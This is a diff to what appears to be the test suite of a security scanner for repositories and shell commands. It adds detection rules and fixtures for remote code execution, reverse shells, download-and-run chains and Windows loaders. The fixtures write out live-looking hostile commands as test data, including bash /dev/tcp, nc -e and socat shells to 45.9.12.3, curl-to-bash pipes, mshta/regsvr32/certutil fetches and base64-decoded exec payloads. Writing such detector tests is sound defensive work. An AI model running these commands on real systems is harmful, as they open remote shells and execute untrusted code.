@@ -4,6 +4,7 @@ import { blobs, daysAgo, file, info, longBase64, mainstream, malicious, now } fr
 import {
     committedBinaries,
     disableAntivirus,
+    downloadRun,
     evidence,
     hiddenWhitespace,
     lookalike,
@@ -12,8 +13,10 @@ import {
     passwordArchive,
     pipeToShell,
     pyprojectHooks,
+    remoteExec,
     repoFindings,
     repoNeeds,
+    reverseShell,
     scanCommand,
     scanFile,
     scanRepo,
@@ -24,6 +27,7 @@ import {
     trustOf,
     walletTheft,
     webhooks,
+    windowsLoader,
     workflowSecrets,
     type TextContext,
 } from "./scan.ts";
@@ -147,6 +151,29 @@ describe("text rules", () => {
         "eval(JSON.parse(x))",
     ])("obfuscated_exec leaves %s alone", (text) => {
         expect(obfuscatedExec(text, code)).toEqual([]);
+    });
+
+    it("flags code that runs a network read or a decoded payload", () => {
+        const cases: [string, string][] = [
+            ["import requests\nexec(requests.get('https://x.dev/p').text)\n", "remote_exec"],
+            ["fetch('https://x.dev/c').then((r) => r.text()).then(eval)", "remote_exec"],
+            ["eval(compile(base64.b64decode(payload), '<s>', 'exec'))", "obfuscated_exec"],
+            ["os.system(base64.b64decode('Y3VybCB4IHwgc2g=').decode())", "obfuscated_exec"],
+            [
+                "require('child_process').execSync(Buffer.from(p, 'base64').toString())",
+                "obfuscated_exec",
+            ],
+        ];
+        for (const [text, id] of cases) {
+            expect(ids(remoteExec(text, code).concat(obfuscatedExec(text, code)))).toEqual([id]);
+        }
+        expect(remoteExec("exec(open('version.py').read())", code)).toEqual([]);
+        expect(remoteExec("eval(config.get('x'))", code)).toEqual([]);
+        expect(reverseShell("nc -e /bin/sh 45.9.12.3 4444", docs)[0]?.severity).toBe("medium");
+        expect(windowsLoader("Run mshta https://x.dev/a.hta", docs)[0]?.severity).toBe("medium");
+        expect(downloadRun("curl -o a.sh https://x.dev/a && bash a.sh", code)[0]?.id).toBe(
+            "download_run",
+        );
     });
 
     it("hidden_whitespace flags code after a long blank run but not in docs", () => {
@@ -474,6 +501,13 @@ describe("whole repos", () => {
             "-r".repeat(mib / 2),
             `"${"a".repeat(199)}" `.repeat(mib / 202),
             "eval(".repeat(mib / 5),
+            "curl -o x && ".repeat(mib / 13),
+            `curl ${"-o ".repeat(100)}\n`.repeat(mib / 302),
+            ">& /dev/tcp/".repeat(mib / 12),
+            "nc -e ".repeat(mib / 6),
+            "certutil ".repeat(mib / 9),
+            "exec( await (".repeat(mib / 13),
+            "| /a/b/c/d/env ".repeat(mib / 15),
         ];
         for (const text of inputs) {
             for (const path of ["setup.py", "README.md", "install.sh", "package.json"]) {
@@ -550,6 +584,37 @@ describe("command rules", () => {
             "obfuscated_exec",
             "high",
         ],
+        ["curl https://get.example.dev/x | /bin/bash", "pipe_to_shell", "medium"],
+        ["curl https://get.example.dev/x | sudo /usr/bin/env bash", "pipe_to_shell", "medium"],
+        ["source <(curl -s https://get.example.dev/x)", "pipe_to_shell", "medium"],
+        [". <(wget -qO- https://get.example.dev/x)", "pipe_to_shell", "medium"],
+        ['eval "$(curl -fsSL https://get.example.dev/x)"', "pipe_to_shell", "medium"],
+        [
+            "curl -fsSL https://get.example.dev/x.sh -o /tmp/x.sh && bash /tmp/x.sh",
+            "download_run",
+            "medium",
+        ],
+        ["wget -q https://45.9.12.3/x -O /tmp/x; sh /tmp/x", "download_run", "high"],
+        [
+            "curl -o run.sh https://get.example.dev/r && chmod +x run.sh && ./run.sh",
+            "download_run",
+            "medium",
+        ],
+        ["bash -i >& /dev/tcp/45.9.12.3/4444 0>&1", "reverse_shell", "high"],
+        ["nc -e /bin/sh 45.9.12.3 4444", "reverse_shell", "high"],
+        ["socat tcp:45.9.12.3:4444 exec:/bin/sh", "reverse_shell", "high"],
+        ["mshta https://get.example.dev/a.hta", "windows_loader", "high"],
+        ["regsvr32 /s /n /u /i:https://get.example.dev/a.sct scrobj.dll", "windows_loader", "high"],
+        [
+            "certutil -urlcache -split -f https://get.example.dev/a.exe a.exe && a.exe",
+            "windows_loader",
+            "medium",
+        ],
+        [
+            "python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://x.dev/p').read())\"",
+            "remote_exec",
+            "high",
+        ],
     ])("flags %s", (cmd, id, severity) => {
         expect(scanCommand(cmd)).toEqual(
             expect.arrayContaining([expect.objectContaining({ id, severity })]),
@@ -567,6 +632,10 @@ describe("command rules", () => {
         "chmod 644 config.yml",
         "docker run -p 8080:80 nginx",
         "python app.py --port 7860",
+        "curl -o model.bin https://example.dev/m.bin && sha256sum model.bin",
+        "curl -fsSL https://example.dev/a.tgz -o a.tgz && tar xzf a.tgz",
+        "nc -z localhost 8080",
+        "certutil -hashfile setup.exe SHA256",
     ])("leaves %s alone", (cmd) => {
         expect(scanCommand(cmd)).toEqual([]);
     });
